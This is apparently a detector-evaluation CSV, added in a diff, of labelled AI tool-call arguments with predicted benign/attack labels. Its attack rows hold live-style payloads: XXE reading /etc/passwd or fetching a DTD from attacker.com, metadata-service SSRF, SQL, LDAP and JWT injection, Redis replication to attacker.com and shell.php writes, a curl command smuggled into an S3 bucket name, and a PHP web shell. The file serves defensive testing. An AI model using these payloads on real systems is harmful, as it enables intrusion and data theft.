@@ -1,0 +1,305 @@
+tool_name,payload,true_label,pred_label,confidence,pattern_category,matched,binary_pred
+graphql_query,"{""query"": ""query { user(id: 4) { name email } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { searchProducts(query: \""laptop\"") { id name } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { order(id: 22) { total status } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""mutation { updateItem(id: 6, status: \""active\"") { id } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { user(id: 18) { name email } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { user(id: 0) { name email } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { product(id: 34) { name price } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { products(first: 10) { edges { node { name price } } } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { product(id: 8) { name price } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""{ __typename }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""mutation { updateItem(id: 24, status: \""active\"") { id } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { product(id: 14) { name price } }"", ""variables"": {""id"": ""123""}}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""mutation { createPost(title: \""Test\"") { id } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { me { id name email } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { categories { id name products { name } } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { comments(postId: 20) { id text } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { user(id: 1) { name email } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { user(id: 32) { name email } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { posts(first: 15) { edges { node { title } } } }"", ""variables"": {""id"": ""123""}}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""mutation { updateItem(id: 16, status: \""active\"") { id } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""mutation { createPost(title: \""Hello\"") { id } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query GetUser($id: ID!) { user(id: $id) { name } }"", ""variables"": {""id"": ""123""}}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { product(id: 36) { name price } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { comments(postId: 30) { id text } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { comments(postId: 26) { id text } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { user(id: 2) { name email } }"", ""variables"": {""id"": ""123""}}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""mutation { updateItem(id: 12, status: \""active\"") { id } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""mutation { updateUser(id: 1, name: \""John\"") { id } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { orders(status: PENDING) { id total } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { order(id: 28) { total status } }""}",benign,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { users { email passwordHash } }""}",attack,attack,0.95,secrets_access,True,attack
+graphql_query,"{""query"": ""query { users(first: 999999999) { edges { node { id } } } }""}",attack,defer,0.0,,False,benign
+graphql_query,"{""query"": ""{\""query\"": \""query { user(id: \\\""1 OR 1=1\\\"") { name } }\""}""}",attack,attack,0.95,sql_injection,True,attack
+graphql_query,"{""query"": ""query { auditLogs { action userId ipAddress } }""}",attack,defer,0.0,,False,benign
+graphql_query,"{""query"": ""mutation { deleteAllUsers { count } }""}",attack,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { __schema { types { name fields { name } } } }""}",attack,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { __type(name: \""User\"") { fields { name type { name } } } }""}",attack,defer,0.0,,False,benign
+graphql_query,"{""query"": ""query { admin { apiKey secretToken } }""}",attack,attack,0.95,secrets_access,True,attack
+graphql_query,"{""query"": ""query x($id: String!) { user(id: $id) { name } }"", ""variables"": {""id"": ""1; DROP TABLE use",attack,attack,0.95,sql_injection,True,attack
+graphql_query,"{""query"": ""query { a]};alert(1)// }""}",attack,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(cn=User 18)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(objectClass=person)"", ""base"": ""dc=example,dc=com""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(uid=user14)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(title=Engineer)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(mail=user12@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(sn=Smith)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(&(department=IT)(active=true))"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(&(department=dept0)(active=true))"", ""base"": ""ou=users,dc=example,dc=com""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(telephoneNumber=*)"", ""base"": ""ou=contacts,dc=example,dc=com""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(mail=user34@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(&(department=dept4)(active=true))"", ""base"": ""ou=users,dc=example,dc=com""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(cn=John Doe)"", ""base"": ""ou=contacts,dc=example,dc=com""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(cn=User 28)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(uid=john)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(mail=user6@example.com)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(employeeNumber=2)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(uid=user36)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(mail=user16@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(employeeNumber=20)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(employeeNumber=22)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(mail=user32@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(&(department=dept0)(active=true))"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(&(department=dept6)(active=true))"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(mail=*@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(employeeNumber=0)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(uid=user8)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(employeeNumber=24)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""\\00*)(uid=admin"", ""base"": ""ou=users,dc=example,dc=com""}",attack,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(uid=admin)"", ""base"": ""ou=admins,dc=corp,dc=net""}",attack,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(objectClass=*)"", ""base"": ""cn=admin,dc=example,dc=com""}",attack,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""*)(|(objectClass=*))"", ""base"": ""dc=corp,dc=net""}",attack,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""(memberOf=cn=Domain Admins)"", ""base"": ""dc=example,dc=com""}",attack,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""admin)(|(password=*)"", ""base"": ""ou=users,dc=example,dc=com""}",attack,attack,0.95,secrets_access,True,attack
+ldap_query,"{""filter"": ""*)(objectClass=*"", ""base"": ""dc=example,dc=com""}",attack,defer,0.0,,False,benign
+ldap_query,"{""filter"": "")(cn=*)(|(cn=*"", ""base"": ""dc=corp,dc=net""}",attack,defer,0.0,,False,benign
+ldap_query,"{""filter"": ""*)(uid=*))(|(uid=*"", ""base"": ""dc=example,dc=com""}",attack,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<config><item id=\""18\"">value</item></config>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>12</id></data>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<users><user id=\""1\""><name>John</name></user></users>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>2</id></data>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<users><user id=\""10\""><name>User10</name></user></users>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 22</message></response>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<order id=\""8\""><status>pending</status></order>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 28</message></response>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<note><to>User</to><from>Admin</from><body>Hello</body></note>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<order id=\""24\""><status>pending</status></order>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<feed><entry><title>Hello</title></entry></feed>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<order><id>123</id><items><item>Book</item></items></order>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><item>test</item></data>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<users><user id=\""16\""><name>User16</name></user></users>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<config><item id=\""30\"">value</item></config>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<users><user id=\""26\""><name>User26</name></user></users>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<products><product><name>Widget</name><price>9.99</price></product></products>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<config><item id=\""0\"">value</item></config>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<config><item id=\""6\"">value</item></config>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<response status=\""ok\""><message>Success</message></response>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<config><setting name=\""debug\"">false</setting></config>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>4</id></data>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<config><item id=\""20\"">value</item></config>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 14</message></response>""}",benign,defer,0.0,,False,benign
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'><!ENTITY %",attack,attack,0.95,system_files,True,attack
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE data [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/m",attack,attack,0.95,xxe_attacks,True,attack
+parse_xml,"{""xml"": ""<!DOCTYPE test [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passw",attack,attack,0.95,system_files,True,attack
+parse_xml,"{""xml"": ""<credentials><username>admin</username><password>secret</password></credentials>""}",attack,attack,0.95,secrets_access,True,attack
+parse_xml,"{""xml"": ""<config><apiKey>sk-xxx</apiKey></config>""}",attack,attack,0.95,secrets_access,True,attack
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;",attack,attack,0.95,system_files,True,attack
+parse_xml,"{""xml"": ""<!DOCTYPE :[ <!ENTITY x SYSTEM \""file:///dev/random\""> ]><x>&x;</x>""}",attack,attack,0.95,xxe_attacks,True,attack
+parse_xml,"{""xml"": ""<!DOCTYPE root [<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;%send;]><root></r",attack,attack,0.95,xxe_attacks,True,attack
+redis_command,"{""command"": ""GET"", ""args"": [""session:18""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""GET"", ""args"": [""session:22""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""HGET"", ""args"": [""user:28"", ""name""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""HSET"", ""args"": [""user:1"", ""email"", ""john@example.com""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:14"", ""3600""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""HGET"", ""args"": [""user:6"", ""name""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""INCR"", ""args"": [""counter""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:38""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""SADD"", ""args"": [""tags"", ""python""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""ZADD"", ""args"": [""leaderboard"", ""100"", ""user1""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:0"", ""task0""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""HGET"", ""args"": [""user:10"", ""name""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue"", ""task1""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""HGET"", ""args"": [""user:1"", ""name""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""SET"", ""args"": [""cache:page"", ""data""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""GET"", ""args"": [""session:123""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""GET"", ""args"": [""session:2""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:20""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""SET"", ""args"": [""cache:page:36"", ""data""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:30""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:32""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""SET"", ""args"": [""cache:page:4"", ""data""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:3"", ""task8""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:1"", ""task26""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:12""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:24""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""TTL"", ""args"": [""session:123""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:16"", ""3600""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""EXPIRE"", ""args"": [""cache:key"", ""3600""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""GET"", ""args"": [""session:34""]}",benign,defer,0.0,,False,benign
+redis_command,"{""command"": ""DEBUG"", ""args"": [""SEGFAULT""]}",attack,defer,0.0,,False,benign
+redis_command,"{""command"": ""KEYS"", ""args"": [""*""]}",attack,defer,0.0,,False,benign
+redis_command,"{""command"": ""EVAL"", ""args"": [""return os.execute('id')"", ""0""]}",attack,defer,0.0,,False,benign
+redis_command,"{""command"": ""MODULE"", ""args"": [""LOAD"", ""/tmp/malicious.so""]}",attack,defer,0.0,,False,benign
+redis_command,"{""command"": ""CONFIG"", ""args"": [""GET"", ""requirepass""]}",attack,defer,0.0,,False,benign
+redis_command,"{""command"": ""FLUSHALL"", ""args"": []}",attack,defer,0.0,,False,benign
+redis_command,"{""command"": ""SLAVEOF"", ""args"": [""attacker.com"", ""6379""]}",attack,defer,0.0,,False,benign
+redis_command,"{""command"": ""INFO"", ""args"": []}",attack,defer,0.0,,False,benign
+redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dir"", ""/var/www/html""]}",attack,defer,0.0,,False,benign
+redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dbfilename"", ""shell.php""]}",attack,defer,0.0,,False,benign
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoidGVzdCJ9.sig""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature10""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature4""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature30""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSmFuZSJ9.sig""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature24""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature0""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature14""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature28""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature16""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjN9.sig""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJhcHAiLCJzdWIiOiJ1c2VyMSJ9.signature""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature18""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature6""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature2""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature20""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwi",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature26""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature8""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature22""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature12""}",benign,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Inwgc2xlZXAgMTAgfCJ9.eyJyb2xlIjoiYWRtaW4ifQ.s",attack,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.sig"", ""key"": ""file:///etc/pas",attack,attack,0.95,system_files,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJhcGlfa2V5IjoieHh4In0.sig""}",attack,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.""}",attack,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJvY3QiLCJrIjoiYXR0YWNrZXJfa2V5In19.",attack,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJyb2xlIjoiYW",attack,attack,0.95,secrets_access,True,attack
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.secret""}",attack,attack,0.95,secrets_access,True,attack
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/18/""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""key"": ""reports/report10.csv""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/2/""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user24/file.txt""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/14/""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/8/""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""list"", ""bucket"": ""logs"", ""prefix"": ""2024/01/""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user12/file.txt""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""put"", ""bucket"": ""backups"", ""key"": ""2024/backup.sql""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""delete"", ""bucket"": ""temp"", ""key"": ""cache/old.json""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""get"", ""bucket"": ""documents"", ""key"": ""reports/annual.pdf""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user123/photo.jpg""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""key"": ""cache/old.json"", ""prefix"": ""images/26/""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""prefix"": ""images/"", ""key"": ""user16/file.txt""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""get"", ""bucket"": ""my-app-data"", ""key"": ""uploads/file.pdf""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user0/file.txt""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""head"", ""bucket"": ""assets"", ""key"": ""logo.png""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""key"": ""uploads/file.pdf"", ""prefix"": ""images/30/""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-8"", ""key"": ""files/doc28.pdf""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-0"", ""key"": ""files/doc20.pdf""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""prefix"": ""images/"", ""key"": ""reports/report4.csv""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-6"", ""key"": ""files/doc6.pdf""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""key"": ""reports/report22.csv""}",benign,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""get"", ""bucket"": ""hr-data"", ""key"": ""employee-ssn.csv""}",attack,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""get"", ""bucket"": ""company-secrets"", ""key"": ""credentials.json""}",attack,attack,0.95,secrets_access,True,attack
+s3_operation,"{""operation"": ""list"", ""bucket"": ""audit-logs"", ""prefix"": """"}",attack,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""list"", ""bucket"": ""`curl attacker.com`"", ""prefix"": """"}",attack,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""get"", ""bucket"": ""http://169.254.169.254/latest/meta-data"", ""key"": ""iam/""}",attack,attack,0.95,ssrf_attacks,True,attack
+s3_operation,"{""operation"": ""put"", ""bucket"": ""public-bucket"", ""key"": ""shell.php"", ""content"": ""<?php system($_GET['",attack,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""copy"", ""source"": ""s3://victim-bucket/secrets"", ""dest"": ""s3://attacker-bucket/stolen""}",attack,defer,0.0,,False,benign
+s3_operation,"{""operation"": ""get"", ""bucket"": ""../../../../etc"", ""key"": ""passwd""}",attack,attack,0.95,path_traversal,True,attack
+send_webhook,"{""url"": ""https://api.pagerduty.com/webhooks"", ""payload"": {""event"": ""trigger""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/2"", ""payload"": {""event"": ""event_2""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 10""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 0""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://webhook.site/32"", ""payload"": {""data"": 32}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/6"", ""payload"": {""event"": ""event_6""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://webhook.site/14"", ""payload"": {""data"": 14}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://discord.com/api/webhooks/xxx/yyy"", ""payload"": {""content"": ""Message""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://webhook.site/8"", ""payload"": {""data"": 8}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://api.zapier.com/hooks/catch/xxx"", ""payload"": {""data"": ""test""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://api.github.com/repos/owner/repo/dispatches"", ""payload"": {""event_type"": ""deploy""}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://webhook.site/22"", ""payload"": {""data"": 22}}",benign,defer,0.0,,False,benign
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/18"", ""payload"": {""event"": ""event_18""}}",benign,defer,0.0,,False,benign
